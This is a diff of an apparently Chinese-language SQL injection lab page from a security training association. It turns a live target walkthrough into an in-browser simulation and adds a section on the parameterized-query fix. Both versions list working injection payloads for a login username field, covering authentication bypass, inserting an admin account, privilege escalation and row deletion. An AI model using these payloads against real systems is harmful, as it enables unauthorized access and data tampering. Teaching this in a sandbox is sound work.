@@ -3,73 +3,80 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lab 01 SQL Injection | ESAM WEB ATTACK LAB</title>
-<meta name="description" content="SQL Injection 靶機教學：登入繞過、提權與資料竄改，含可複製 payload 與參數化查詢修補。">
+<title>Lab 01 SQL Injection | ESAM Web 攻防 Lab</title>
+<meta name="description" content="SQL Injection 模擬練習：在瀏覽器內繞過登入、提權與竄改資料，含可填入的 payload 與參數化查詢修補。">
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
 <nav class="nav">
-  <div class="brand">ESAM<span>//</span>WEB_ATTACK_LAB</div>
+  <div class="brand"><span class="mark">▦</span>ESAM Web 攻防 Lab</div>
   <div class="nav-links">
-    <a href="index.html">Home</a>
-    <a href="lab1-sqli.html">01 SQLi</a>
-    <a href="lab2-xss.html">02 XSS</a>
-    <a href="lab3-ssti.html">03 SSTI</a>
+    <a href="index.html">總覽</a>
+    <a href="lab1-sqli.html">SQL Injection</a>
+    <a href="lab2-xss.html">XSS</a>
+    <a href="lab3-ssti.html">SSTI</a>
   </div>
 </nav>
+<div class="sandbox-bar">課程沙盒 · 所有帳號與資料皆為虛構，僅供授權教學使用</div>
 
 <main class="wrap">
-  <div class="kicker">// LAB 01</div>
+  <div class="kicker">Lab 01</div>
   <h1 class="title">SQL Injection</h1>
   <p class="lead">登入系統把使用者輸入直接拼進 SQL 查詢字串，攻擊者可藉此繞過登入驗證，並進一步新增、竄改或刪除資料庫內容。</p>
-  <p><span class="badge high">嚴重度 High</span> &nbsp; <span class="badge info">PORT 5000</span></p>
+  <p><span class="badge high">嚴重度 High</span> &nbsp; <span class="badge info">模擬登入 + 資料表</span></p>
 
   <h2>漏洞原理</h2>
   <p>登入時伺服器組出的查詢語法如下，使用者輸入被當成查詢條件的一部分：</p>
   <div class="cmd">
-    <div class="cmd-head"><span>vulnerable query</span><button class="copy">Copy</button></div>
+    <div class="cmd-head"><span>有漏洞的查詢</span><button class="copy">複製</button></div>
     <pre>SELECT * FROM users WHERE username = '&lt;輸入&gt;' AND password = '&lt;輸入&gt;'</pre>
   </div>
-  <p>靶機以 <code>executescript()</code> 執行查詢，代表它允許一次執行多條以分號 <code>;</code> 分隔的 SQL。因此攻擊者不只能繞過登入，還能接著執行 <code>INSERT</code>、<code>UPDATE</code>、<code>DELETE</code>。登入成功後首頁會列出整個資料庫表格，方便在操作時觀察資料變化。</p>
+  <p>靶機以 <code>executescript()</code> 執行查詢，允許一次執行多條以分號 <code>;</code> 分隔的 SQL。因此攻擊者不只能繞過登入，還能接著執行 <code>INSERT</code>、<code>UPDATE</code>、<code>DELETE</code>。</p>
 
-  <div class="panel">
-    <span class="tag">靶機資訊</span>
-    <table>
-      <tr><th>內建帳號</th><td><code>admin / 123456</code>（管理員）、<code>pony / password</code>（一般使用者）</td></tr>
-      <tr><th>資料還原</th><td>資料庫被改壞時，開啟 <code>/reset-db</code> 還原成初始兩個帳號</td></tr>
-    </table>
+  <h2>模擬練習</h2>
+  <p class="lead">直接在下面這個模擬登入操作。點 payload 旁的「填入」帶進帳號欄，密碼可留白或亂打，按執行後看結果與資料表變化。</p>
+
+  <div class="sim" id="sqli-sim">
+    <span class="sim-tag">模擬登入</span>
+    <h3>DemoBank 登入</h3>
+    <label for="sqli-user">模擬 Username</label>
+    <input type="text" id="sqli-user" autocomplete="off" spellcheck="false">
+    <label for="sqli-pass">模擬 Password</label>
+    <input type="text" id="sqli-pass" autocomplete="off" spellcheck="false">
+    <div class="btn-row">
+      <button class="btn" id="sqli-login">執行模擬登入</button>
+      <button class="btn ghost" id="sqli-reset">重置資料表</button>
+    </div>
+    <div class="sim-out" id="sqli-out"></div>
+
+    <div class="payload-list">
+      <div class="pl-item">
+        <div><div class="pl-label">1. 繞過密碼登入管理員</div><div class="pl-code">ADMIN' OR 1=1 -- </div></div>
+        <button class="use" data-target="sqli-user" data-value="ADMIN' OR 1=1 -- ">填入帳號</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">2. 新增 hacker / 9999 並設為管理員</div><div class="pl-code">ADMIN'; INSERT INTO users(username,password,isAdmin) VALUES ('hacker','9999',1); -- </div></div>
+        <button class="use" data-target="sqli-user" data-value="ADMIN'; INSERT INTO users(username,password,isAdmin) VALUES ('hacker','9999',1); -- ">填入帳號</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">3. 把 pony 設為管理員</div><div class="pl-code">'; UPDATE users SET isAdmin=1 WHERE username='pony'; -- </div></div>
+        <button class="use" data-target="sqli-user" data-value="'; UPDATE users SET isAdmin=1 WHERE username='pony'; -- ">填入帳號</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">4. 刪除 pony</div><div class="pl-code">hacker'; DELETE FROM users WHERE username='pony'; -- </div></div>
+        <button class="use" data-target="sqli-user" data-value="hacker'; DELETE FROM users WHERE username='pony'; -- ">填入帳號</button>
+      </div>
+    </div>
+
+    <h3>目前資料表</h3>
+    <div id="sqli-table"></div>
+    <div class="sim-note">正常示範帳密：ADMIN / admin001。注入 payload 貼到帳號欄，密碼可留白。每次執行後回看資料表變化。</div>
   </div>
 
-  <h2>操作步驟</h2>
-  <ol class="steps">
-    <li>
-      <strong>繞過登入。</strong>帳號欄位輸入下列字串，密碼隨意。<code>OR 1=1</code> 使條件永遠成立，<code>--</code> 將其後的密碼檢查註解掉，因此不需正確密碼即可登入。注意 <code>--</code> 後面要保留一個空格。
-      <div class="cmd">
-        <div class="cmd-head"><span>username 欄位</span><button class="copy">Copy</button></div>
-        <pre>Admin' OR 1=1 -- </pre>
-      </div>
-    </li>
-    <li><strong>觀察權限差異。</strong>登入後以 admin 介面新增一個不具管理權限的使用者，登出後改用新帳號登入，確認它無法進入 admin 頁面。</li>
-    <li>
-      <strong>注入提權。</strong>在帳號欄位貼入下列字串，將指定使用者升級為管理員。
-      <div class="cmd">
-        <div class="cmd-head"><span>提權 payload</span><button class="copy">Copy</button></div>
-        <pre>'; UPDATE users SET isAdmin=1 WHERE username='pony'; -- </pre>
-      </div>
-    </li>
-    <li>
-      <strong>注入刪除資料。</strong>以同樣方式刪除指定使用者，回到首頁即可看到資料表的變化。
-      <div class="cmd">
-        <div class="cmd-head"><span>刪除 payload</span><button class="copy">Copy</button></div>
-        <pre>hacker'; DELETE FROM users WHERE username='pony'; -- </pre>
-      </div>
-    </li>
-  </ol>
-
   <h2>防禦修補</h2>
-  <p>根本做法是採用<strong>參數化查詢（prepared statement）</strong>，把使用者輸入當成純資料綁定，而非以字串拼接組成 SQL。靶機中 admin 新增使用者那段即為正確寫法，可作對照。</p>
+  <p>根本做法是採用<strong>參數化查詢（prepared statement）</strong>，把使用者輸入當成純資料綁定，而非以字串拼接組成 SQL。輸入即使含有引號或分號，也只會被當成字串，不會改變語法結構。</p>
   <div class="cmd">
-    <div class="cmd-head"><span>正確寫法</span><button class="copy">Copy</button></div>
+    <div class="cmd-head"><span>正確寫法</span><button class="copy">複製</button></div>
     <pre>cursor.execute(
     "INSERT INTO users (username, password, isAdmin) VALUES (?, ?, ?)",
     (username, password, is_admin),
@@ -77,13 +84,13 @@
   </div>
 
   <div class="pager">
-    <a href="index.html">← 回首頁</a>
+    <a href="index.html">← 回總覽</a>
     <span class="spacer"></span>
     <a href="lab2-xss.html">Lab 02 XSS →</a>
   </div>
 </main>
 
-<footer class="foot">ESAM 社團法人台灣E化資安分析管理協會 &nbsp;//&nbsp; Web 攻防實戰 Lab</footer>
+<footer class="foot">ESAM 社團法人台灣E化資安分析管理協會 · Web 攻防實戰 Lab</footer>
 <script src="app.js"></script>
 </body>
 </html>
